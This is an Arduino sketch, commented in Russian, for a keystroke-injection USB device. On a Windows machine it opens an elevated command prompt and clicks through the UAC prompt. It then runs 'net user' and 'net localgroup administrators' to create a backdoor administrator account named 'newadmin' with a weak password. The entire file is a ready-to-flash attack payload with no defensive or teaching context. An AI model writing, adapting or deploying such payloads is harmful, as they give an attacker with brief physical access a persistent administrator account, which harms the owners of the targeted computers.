#include <Keyboard.h>

void setup() {
  // Ожидание инициализации
  delay(5000);

  // Открытие "Выполнить"
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  // Ввод команд для создания администратора
  Keyboard.print("cmd");
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
  delay(1000);
  
  // Создание нового администратора
  Keyboard.print("net user newadmin password /add");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("net localgroup administrators newadmin /add");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("exit");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}

void loop() {
  // Пустой цикл
}
